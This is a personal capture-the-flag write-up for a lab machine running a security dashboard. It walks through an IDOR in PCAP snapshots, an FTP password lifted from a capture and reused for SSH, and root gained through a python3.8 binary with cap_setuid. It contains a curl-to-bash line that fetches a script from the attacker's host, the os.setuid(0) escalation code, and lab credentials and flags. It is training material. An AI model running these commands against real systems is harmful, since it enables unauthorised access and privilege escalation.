# Security Dashboard CTF Journal Entry

### Challenge Rating: Medium

**Challenge:**  
Target is a security dashboard web app that includes features like security snapshots (PCAPs), IP and network status, and user activity. The machine tests reconnaissance, web enumeration, IDOR (Insecure Direct Object Reference), network traffic analysis (PCAP/FTP), credential reuse, and Linux privilege escalation via binary capabilities.

**Skills:**  
- Network scanning (`nmap`, `rustscan`)  
- Web enumeration (`feroxbuster`, `dirb`)  
- Source code / HTML inspection (viewing page source, `robots.txt`)  
- Identifying and abusing IDORs (Insecure Direct Object References)  
- PCAP analysis (Wireshark) to extract credentials from application snapshots  
- Credential reuse (FTP → SSH)  
- Local enumeration and privilege escalation with `linPEAS`  
- Exploiting file capabilities (cap_setuid) using Python to gain root

**Notes:**  
- Target IP: `10.10.10.245`  
- Initial scans: `nmap` and `rustscan` → ports open: **21 (FTP)**, **22 (SSH)**, **80 (HTTP)**.  
  - FTP: `vsftpd 3.0.3`  
  - SSH: `OpenSSH 8.2p1`  
  - Webserver: Gunicorn (possible HTTP Request Smuggling via Transfer-Encoding headers — noted but not exploited here)

- Visited the web app as user *Nathan*. Dashboard shows security events, failed logins, and port scans.  
- Hamburger menu has: Security Snapshot (5s PCAP + analysis), IP Config, Network Status.  
- Viewing page source revealed references to people named **Rashed** and **Ratul Hamba**; `robots.txt` gave nothing useful.

- Used `feroxbuster` / `dirb` to enumerate paths (found nothing new beyond known endpoints).  
- Discovered an **IDOR** in Security Snapshot URLs: security snapshot redirect uses `/[something]/[id]`.  
  - Question 2 answer: `data` (the `[something]` in the path is `data`)  
  - By changing the ID you can view other users' snapshots (Question 3: **yes** — can iterate IDs 0..10)

- Inspecting PCAP ID 40 in Wireshark (source `192.168.196.1` → dest `192.168.196.16`) revealed an FTP credential:  
  - `Buck3tH4TF0RM3!` — used to log into SSH as Nathan.

**Answers to challenge questions:**  
1. How many ports are open? **3**  
2. After running a "Security Snapshot", the redirect path uses what string for [something]? **`data`**  
3. Are you able to see other users' scans? **Yes** (IDOR; can iterate 0..10)  
4. What is the ID of the PCAP file that contains sensitive data? **0**  
5. Which application layer protocol in the pcap file can the sensitive data be found in? **FTP**  
6. We've collected Nathan's FTP password. On what other service does this password work? **SSH**  
7. user flag (from Nathan's account): **`35eaae15f1ef0f055e3b983eae63c5aa`**  
8. What is the full path to the binary on this machine that has special capabilities that can be abused to obtain root privileges? **`/usr/bin/python3.8`**

**Privilege escalation (linPEAS & capabilities):**  
- Setup and run `linpeas` by hosting it locally and `curl`ing it to the target:  
  ```bash
  # on attack box
  sudo python3 -m http.server 80

  # on target
  curl http://<OurIP>/linpeas.sh | bash
  ```
- linPEAS highlighted a binary with capabilities: `/usr/bin/python3.8` has `cap_setuid,cap_net_bind_service+eip`.  
  - `cap_setuid` allows changing UID (can set to 0/root).  
  - `cap_net_bind_service` allows binding privileged ports (<1024).  
- Abuse: start the python interpreter and escalate UID:
  ```python
  import os
  os.setuid(0)
  os.system("/bin/bash")
  ```
  Result: spawned shell as **root**.

**Root flag:**  
- Root flag found: **`f77870641aea641726ee29ee9879a5e4`**

**Takeaways:**  
- IDORs are low-hanging fruit — always test incrementing IDs and object identifiers.  
- PCAP snapshots in web apps are gold for leaking credentials — always inspect network captures (Wireshark).  
- Credential reuse across services (FTP → SSH) is a common real-world misconfiguration to abuse.  
- linPEAS saves time but always manually verify and understand findings (capabilities, SUIDs, cron jobs).  
- File capabilities (`cap_setuid`) can be as dangerous as setuid binaries if abused — never assume only SUIDs matter.

**Commands / tools referenced:**  
```bash
nmap -sC -sV -oN nmap_initial 10.10.10.245
rustscan -a 10.10.10.245 -r 1-65535
feroxbuster -u http://10.10.10.245 -w /usr/share/wordlists/...
dirb http://10.10.10.245 /usr/share/wordlists/...
ssh nathan@10.10.10.245 -p 22
sudo python3 -m http.server 80
curl http://<OurIP>/linpeas.sh | bash
# escalate inside python:
python3.8
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
```
## Original Notes:

<details>
ip:  10.10.10.245

we run nmap and rustscan

while they run we try the website. The site is a seucirty dashboard, logged in as a man named Nathan, on here we see security events, failed login attempts, and port scans (unique IPs).

the hamburger menu has a securit snapshot (5 second PCAP + anaysis), ip config, and network status

when we view the main page source, we see that they are using an outdate browser, and to update bia browsehappy.com

robots.txt did nothing

rustscan and nmap says that ports 22/tcp, 21/tcp and 80/tcp are open

port 21 is open ftp with vsftpd 3.0.3
port 22 ssh openSSH 8.2p1

couldn't find an exploit I want to use, the source didn't seem to have any info about passwords
we do see in the source people named Rashed and Ratul Hamba

using dirb to find urls / used feroxbuster too

the website is Gunicorn, looking for exploit. explot-db doens't have anything but myF5 does, it states:
Gunicorn  fails to properly validate Transfer-Encoding headers, leading to HTTP  Request Smuggling (HRS) vulnerabilities. By crafting requests with  conflicting Transfer-Encoding headers, attackers can bypass security  restrictions and access restricted endpoints. This issue is due to  Gunicorn's handling of Transfer-Encoding headers, where it incorrectly  processes requests with multiple, conflicting Transfer-Encoding headers,  treating them as chunked regardless of the final encoding specified.  This vulnerability allows for a range of attacks including cache  poisoning, session manipulation, and data exposure.</span></span></body></html>

so, let's see what we cna do here.bv

feroxbuster found what we already knew
so did dirb

i forgot, to look at the damn questions.

Question 1) how many ports are open : 3

2) After running a "Security Snapshot", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]? :: answer = ‘data’

3) are you able to see other users scans?  yes, we can edit the url and go to data 0, 1, etc, up to our latest of 10

when we look at it in wireshark we see that no.40 with source ip of 192.168.196.1 and destination of 192.168.196.16, we see a password of "Buck3tH4TF0RM3!"
this allowed us to log into ssh
in the ssh, user.txt is a flag of “35eaae15f1ef0f055e3b983eae63c5aa”
4) What is the ID of the PCAP file that contains sensative data?  0

we have a IDOR: Insecure Direct Object Reference (IDOR) vulnerability is a type of broken access control where an application uses user-supplied input to directly access internal objects (like database records or files) without performing sufficient access control or authorization checks. Attackers can manipulate these direct references, such as changing a user ID or file name in a URL


5)  Which application layer protocol in the pcap file can the sensetive data be found in? FTP
it's ftp because we can look at hte wireshark protocol and see it's under ftp

6)We've managed to collect nathan's FTP password. On what other service does this password work? ssh

7) user flag

8) What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?

out next task involves using linpeas, so to use linpeas we need to use the following script : 

we go to our linpeas dir, and run "sudo python3 -m http.server 80" - this opens the server for us to then use the command we need to run linpeas on the target machine

curl http://<OurIP>/linpeas.sh | bash

linpeas is said to be one of thsoe thigns that makes you look smarter than you are, so we need to really understand what it does. First off, linpeas is going to look for weaknesses, misconfigurations, etc. a defintion i found is:

linPEAS (part of the PEASS-ng suite) is an automated Linux enumeration script that searches a host for common misconfigurations, weak permissions, credentials, and other local privilege-escalation paths. It doesn’t “exploit” anything by default — it surfaces potential vectors (SUIDs, writable files, misconfigured services, cron jobs, weak sudo rules, exposed secrets, docker sockets, etc.) so you can investigate manually. Source & project page: PEASS-ng / linPEAS. 

bang! we're in. Linpeas is running. we used curl to get the info from our pc, and piped it into bash using | bash to run it

so , looking through the linpeas, i see we have Pkexec open, maybe try that, it allows us to run a command as anotehr user, maybe root?

besides that we have files with capabilites, and we see that python3.8 = cap_setuid, cap_net_bind_service+eip. It's highlighted yellow, so we know it's odd. doing some digging we see that python normally runs files without capabilities, and a pythong interpreter with cap_setuid + effective can be abused by local users to escalate privileges or bypass restrictions

don't try using pkexec and failing to log in, it reports the failure. fun times

we learned that the python program can escalate privilegas because it as authoritity to use sudo. the python binary has been granted special capabiulites. this will allow malicious scripts to be ran that normally require root. cap_setuid is a powerful capabiltiy that allows ap rocess to make arbitary chagnes to hte User ID UID including chaning a user to root (WOOT WOOT! Our way in!). an acceter could run a simple python script containg os.setuid(0) to gain full root
cap_net_bind_service+eip grants the ability to bind prilveged ports (any below 1024). the suffix of eip indicates that a capaility is et to effectivce, inherited and permitted. Thus allowing python web server to run on sntadard porst like 80 or 443. 
running /usr/bin/python3.8 we open python. Inside python we use:
import os
os.setuid(0)
os.system("/bin/bash")

import improts the os capabilites
we set our id
os.system("/bin/bash") opens a new shell as the id we made, so root!!!


9) Submit the flag located in root's home directory.  -- /usr/bin/python3.8
10) Submit the flag located in root's home directory. -- found teh root flag under root!
“f77870641aea641726ee29ee9879a5e4”
</details>
